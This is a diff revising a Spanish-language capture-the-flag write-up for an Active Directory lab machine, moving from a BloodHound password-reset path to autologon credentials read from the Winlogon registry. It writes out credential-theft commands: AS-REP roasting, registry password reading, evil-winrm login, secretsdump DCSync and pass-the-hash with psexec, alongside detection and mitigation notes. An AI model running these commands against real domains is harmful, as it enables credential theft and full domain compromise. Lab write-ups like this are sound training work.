@@ -15,7 +15,7 @@ tags: [windows, active-directory, kerberos, asrep, winrm, dcsync]
 
 ## TL;DR
 
-El sitio corporativo publica los nombres del equipo, así que el formato de usuario sale sin fuerza bruta. Con la lista se hace **AS-REP roasting** sobre la cuenta sin preautenticación, se crackea el hash y se entra por WinRM. BloodHound muestra un `GenericAll` sobre una cuenta de servicio, se resetea su contraseña y desde ella se ejecuta **DCSync**.
+El sitio corporativo publica los nombres del equipo, así que el formato de usuario sale sin esfuerzo. Con la lista se hace **AS-REP roasting** sobre la cuenta sin preautenticación, se crackea el hash y se entra por WinRM. Dentro, las credenciales de autologon quedan en claro en el registro; esa cuenta de servicio tiene derechos de replicación y con ella se ejecuta **DCSync**.
 
 ## Reconocimiento
 
@@ -40,7 +40,7 @@ echo 'egotistical-bank.htb' | tee -a /etc/hosts
 kerbrute userenum -d egotistical-bank.htb --dc <TARGET_IP> users.txt
 ```
 
-## Foothold: AS-REP roasting
+## Foothold
 
 ```bash
 impacket-GetNPUsers 'egotistical-bank.htb/' -dc-ip <TARGET_IP> -usersfile users.txt -no-pass -format hashcat
@@ -56,17 +56,21 @@ type C:\Users\fsmith\Desktop\user.txt
 
 ## Movimiento lateral
 
-```bash
-bloodhound-python -u fsmith -p '<password>' -d egotistical-bank.htb -ns <TARGET_IP> -c All
-```
-
-BloodHound marca `GenericAll` de `fsmith` sobre la cuenta de servicio `svc_loanmgr`. Se resetea su contraseña y se entra con ella:
+En el host, WinPEAS (o una consulta directa) lee las credenciales de autologon que Windows guarda en claro:
 
 ```powershell
-Set-ADAccountPassword -Identity svc_loanmgr -Reset -NewPassword (ConvertTo-SecureString '<newpass>' -AsPlainText -Force)
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+# DefaultUserName / DefaultPassword -> svc_loanmanager
 ```
 
-## Escalada: DCSync
+Ojo con el nombre: el valor del registro es `svc_loanmanager`, pero el `sAMAccountName` real es `svc_loanmgr`; con el primero WinRM falla. Se comprueba con NetExec y se entra con el segundo:
+
+```bash
+nxc smb <TARGET_IP> -u svc_loanmgr -p '<password>'
+evil-winrm -i <TARGET_IP> -u svc_loanmgr -p '<password>'
+```
+
+## Escalada de privilegios
 
 `svc_loanmgr` tiene derechos de replicación, así que se vuelca la base:
 
@@ -76,18 +80,31 @@ impacket-secretsdump 'egotistical-bank.htb/svc_loanmgr:<newpass>@<TARGET_IP>' -j
 
 Con el hash de Administrator: `impacket-psexec -hashes ':<NT_HASH>' administrator@<TARGET_IP>`.
 
-## Errores típicos
+## Evidencia
+
+- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
+- Los valores reales viven en `private/` y no se publican.
+
+## Lecciones aprendidas
 
 - **`KDC_ERR_C_PRINCIPAL_UNKNOWN`** → el formato de usuario no es el que crees; prueba también nombre.apellido.
 - **AS-REP sin resultados** → la cuenta sí requiere preautenticación; el roasting no aplica.
 - **`Access is denied` en WinRM** → el usuario no está en `Remote Management Users`.
 - **DCSync denegado** → la cuenta no tiene `DS-Replication-Get-Changes`; revisa la ACL real en BloodHound.
 
-## Detección y mitigación
+## Mitigaciones y detección
 
 - **4768** sin preautenticación (AS-REP) y **4769** anómalos.
 - Desactivar `DONT_REQ_PREAUTH` en cuentas de servicio y usar contraseñas largas.
-- Auditar `GenericAll`/`WriteDACL` sobre cuentas de servicio; no delegar reseteos a usuarios normales.
-- Revisar `DS-Replication-Get-Changes` y alertar de `secretsdump` (DRSUAPI).
+- No dejar `DefaultPassword` en `Winlogon`: usar LAPS o cuentas gestionadas para el autologon.
+- Revisar `DS-Replication-Get-Changes` en cuentas de servicio y alertar de `secretsdump` (DRSUAPI).
 
 MITRE: T1558.004, T1098, T1003.006.
+
+## Referencias
+
+- [MITRE T1003.006](https://attack.mitre.org/techniques/T1003/)
+- [MITRE T1098](https://attack.mitre.org/techniques/T1098/)
+- [MITRE T1558.004](https://attack.mitre.org/techniques/T1558/)
+- [kerberos-enum](../../../knowledge/windows/kerberos-enum.md)
+- [rop-stack](../../../knowledge/pwn/rop-stack.md)
